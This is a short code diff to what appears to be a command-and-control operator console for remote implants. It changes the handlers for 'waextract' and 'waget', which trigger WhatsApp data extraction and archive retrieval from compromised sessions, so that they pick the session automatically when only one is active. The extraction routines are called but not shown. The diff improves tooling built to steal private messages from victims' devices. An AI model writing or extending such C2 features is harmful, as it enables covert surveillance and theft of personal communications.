@@ -303,22 +303,26 @@ else:
                     await run_shell(session)
                 else:
                     print(f"[-] Session '{sid}' not found. Use 'list' to see IDs.")
-            elif cmd.startswith("waextract "):
+            elif cmd == "waextract" or cmd.startswith("waextract "):
                 parts = cmd.split(maxsplit=1)
                 sid = parts[1] if len(parts) > 1 else ""
+                if not sid and len(c2_server.active_sessions) == 1:
+                    sid = next(iter(c2_server.active_sessions))
                 session = c2_server.get_session_by_id(sid)
                 if session:
                     await run_whatsapp_extraction(session)
                 else:
-                    print(f"[-] Session '{sid}' not found. Use 'list' to see IDs.")
-            elif cmd.startswith("waget "):
+                    print(f"[-] Session '{sid}' not found. Usage: waextract <id>")
+            elif cmd == "waget" or cmd.startswith("waget "):
                 parts = cmd.split(maxsplit=1)
                 sid = parts[1] if len(parts) > 1 else ""
+                if not sid and len(c2_server.active_sessions) == 1:
+                    sid = next(iter(c2_server.active_sessions))
                 session = c2_server.get_session_by_id(sid)
                 if session:
                     await run_retrieve_archive(session)
                 else:
-                    print(f"[-] Session '{sid}' not found. Use 'list' to see IDs.")
+                    print(f"[-] Session '{sid}' not found. Usage: waget <id>")
 
     c2_task.cancel()
     try:
